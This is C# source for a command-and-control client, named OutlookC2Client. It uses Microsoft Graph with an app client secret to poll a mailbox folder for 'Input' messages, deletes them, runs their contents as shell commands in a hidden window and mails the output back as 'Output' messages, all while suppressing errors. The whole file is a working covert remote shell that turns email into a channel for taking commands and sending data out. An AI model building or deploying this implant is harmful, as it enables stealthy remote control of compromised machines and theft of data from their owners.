using Microsoft.Identity.Client;
using Newtonsoft.Json.Linq;
using System;
using System.Linq;
using System.Net.Http;
using System.Threading.Tasks;
using System.Text;
using Newtonsoft.Json;
using System.Collections.Generic;
using System.Threading;
using System.Configuration;
using System.Globalization;

namespace OutlookC2Client
{
    class Program
    {

        public static string Authority
        {
            get
            {
                return String.Format(CultureInfo.InvariantCulture, ConfigurationManager.AppSettings["Instance"].ToString(), ConfigurationManager.AppSettings["Tenant"].ToString());
            }
        }
        static void Main(string[] args)
        {
            try
            {
                RunAsync().GetAwaiter().GetResult();
            }
            catch (Exception ex)
            {
                //Console.ForegroundColor = ConsoleColor.Red;
                //Console.WriteLine(ex.Message);
                //Console.ResetColor();
            }

            //Console.WriteLine("Press any key to exit");
            //Console.ReadKey();
        }

        private static async Task RunAsync()
        {
            try
            {
                AuthenticationResult result = null;
                result = await Auth();
                DateTime exp = result.ExpiresOn.DateTime;


                if (result != null)
                {
                    var httpClient = new HttpClient();
                    var apiCaller = new ProtectedApiCallHelper(httpClient);


                    string userid = await GetUserID(result.AccessToken, ConfigurationManager.AppSettings["User"].ToString());
                    string mailfolderid = await GetFolderID(result.AccessToken, userid, ConfigurationManager.AppSettings["FolderName"].ToString());

                    while (true)
                    {
                        string input = null;
                        while (input == null)
                        {
                            int exptime = DateTime.Compare(exp, DateTime.Now.ToUniversalTime().AddMinutes(10));
                            if (exptime < 0)
                            {
                                result = await Auth();
                                exp = result.ExpiresOn.DateTime;
                            }
                            input = await ReadMessage(result.AccessToken, userid, mailfolderid);

                            if (input != null & input != "")
                            {
                                try
                                { 
                                var output = ShellExecuteWithPath(input, @"c:\\windows\system32\");
                                await SendMessage(result.AccessToken, userid, mailfolderid, output);
                                }
                                catch(Exception ex)
                                {
                                    await SendMessage(result.AccessToken, userid, mailfolderid, ex.Message);
                                    //Console.WriteLine(ex.Message);
                                }
                            }
                            Thread.Sleep(2000);
                        }
                    }
                }
            }
            catch(Exception ex)
            {
                //Console.WriteLine(ex.Message);
            }
        }


        public static async Task<AuthenticationResult> Auth()
        {

            IConfidentialClientApplication app;

            app = ConfidentialClientApplicationBuilder.Create(ConfigurationManager.AppSettings["ClientId"].ToString())
                .WithClientSecret(ConfigurationManager.AppSettings["ClientSecret"].ToString())
                .WithAuthority(new Uri(Program.Authority))
                .Build();

            string[] scopes = new string[] { "https://graph.microsoft.com/.default" };

            AuthenticationResult result = null;
            try
            {
                var accounts = await app.GetAccountsAsync();
                var firstAccount = accounts.FirstOrDefault();
                result = await app.AcquireTokenForClient(scopes)
                    .ExecuteAsync();

            }
            catch (Exception ex)
            {
                //Console.WriteLine(ex.Message);
            }

            return result;
        }

        public static async Task<string> GetUserID(string AccessToken, string user)
        {
            #region GetUserID
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            getuserid userid = new getuserid();
            var url = $"https://graph.microsoft.com/beta/users?$select=id&$filter=startswith(displayname, '{user}')";
            JObject users = await apiCaller.CallGetWebApiAndProcessResultASync(url, AccessToken);

            IList<JToken> userresults = users["value"].Children().ToList();

            IList<getuserid> usersearchResults = new List<getuserid>();
            foreach (JToken res in userresults)
            {
                userid = res.ToObject<getuserid>();
                usersearchResults.Add(userid);
            }
            return userid.id;
            #endregion GetUserID
        }

        public static async Task<string> GetFolderID(string AccessToken, string userid, string FolderName)
        {
            #region GetFolderID
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            getmailfolderid mailfolderid = new getmailfolderid();
            var url = $"https://graph.microsoft.com/beta/users/{userid}/mailFolders?$select=id&$filter=startswith(displayname, '{FolderName}')";

            JObject mailfolder = await apiCaller.CallGetWebApiAndProcessResultASync(url, AccessToken);

            IList<JToken> mailfolderresults = mailfolder["value"].Children().ToList();

            IList<getmailfolderid> mailfoldersearchResults = new List<getmailfolderid>();
            foreach (JToken res in mailfolderresults)
            {
                mailfolderid = res.ToObject<getmailfolderid>();
                mailfoldersearchResults.Add(mailfolderid);
            }
            return mailfolderid.id;
            #endregion GetFolderID
        }

        public static async Task SendMessage(string AccessToken, string userid, string mailfolderid, string value)
        {

            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            var url = $"https://graph.microsoft.com/beta/users/{userid}/mailFolders/{mailfolderid}/messages ";
            createmessages createmailmessagedetails = new createmessages();

            messagebody body = new messagebody();
            body.contentType = "Text";
            body.content = value;

            createmailmessagedetails.subject = "Output";
            createmailmessagedetails.body = body;

            string data = JsonConvert.SerializeObject(createmailmessagedetails);


            JObject createmailmessage = await apiCaller.CallPostWebApiAndProcessResultASync(url, AccessToken, data);

        }

        public static async Task<string> ReadMessage(string AccessToken, string userid, string mailfolderid)
        {
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            getmessages mailmessagedetails = new getmessages();

            var url = $"https://graph.microsoft.com/beta/users/{userid}/mailFolders/{mailfolderid}/messages?filter=startswith(subject,'Input')";

            JObject mailmessage = await apiCaller.CallGetWebApiAndProcessResultASync(url, AccessToken);
            IList<JToken> mailmessages = null;
            IList<getmessages> mailmessageresults = null;

            mailmessages = mailmessage["value"].Children().ToList();
            if (mailmessages.Count > 0)
            {
                mailmessageresults = new List<getmessages>();

                foreach (JToken res in mailmessages)
                {
                    mailmessagedetails = res.ToObject<getmessages>();
                    mailmessageresults.Add(mailmessagedetails);
                }
                await DeleteMessage(AccessToken, userid, mailmessagedetails.id);
                return mailmessagedetails.body.content;
            }
            else
            {
                return null;
            }
        }

        public static async Task DeleteMessage(string AccessToken, string userid, string messageid)
        {
            var httpClient = new HttpClient();
            var apiCaller = new ProtectedApiCallHelper(httpClient);

            var url = $"https://graph.microsoft.com/beta/users/{userid}/messages/{messageid}";

            JObject mailmessage = await apiCaller.CallDeleteWebApiAndProcessResultASync(url, AccessToken);
        }

        public static string ShellExecuteWithPath(string ShellCommand, string Path, string Username = "", string Domain = "", string Password = "")
        {
            if (ShellCommand == null || ShellCommand == "") return "";

            string ShellCommandName = ShellCommand.Split(' ')[0];
            string ShellCommandArguments = "";
            if (ShellCommand.Contains(" "))
            {
                ShellCommandArguments = ShellCommand.Replace(ShellCommandName + " ", "");
            }

            System.Diagnostics.Process shellProcess = new System.Diagnostics.Process();
            if (Username != "")
            {
                shellProcess.StartInfo.UserName = Username;
                shellProcess.StartInfo.Domain = Domain;
                System.Security.SecureString SecurePassword = new System.Security.SecureString();
                foreach (char c in Password)
                {
                    SecurePassword.AppendChar(c);
                }
                shellProcess.StartInfo.Password = SecurePassword;
            }
            shellProcess.StartInfo.FileName = ShellCommandName;
            shellProcess.StartInfo.Arguments = ShellCommandArguments;
            shellProcess.StartInfo.WorkingDirectory = Path;
            shellProcess.StartInfo.UseShellExecute = false;
            shellProcess.StartInfo.CreateNoWindow = true;
            shellProcess.StartInfo.RedirectStandardOutput = true;
            shellProcess.StartInfo.RedirectStandardError = true;

            var output = new StringBuilder();
            shellProcess.OutputDataReceived += (sender, args) => { output.AppendLine(args.Data); };
            shellProcess.ErrorDataReceived += (sender, args) => { output.AppendLine(args.Data); };

            shellProcess.Start();

            shellProcess.BeginOutputReadLine();
            shellProcess.BeginErrorReadLine();
            shellProcess.WaitForExit();

            return output.ToString().TrimEnd();
        }


    }
}
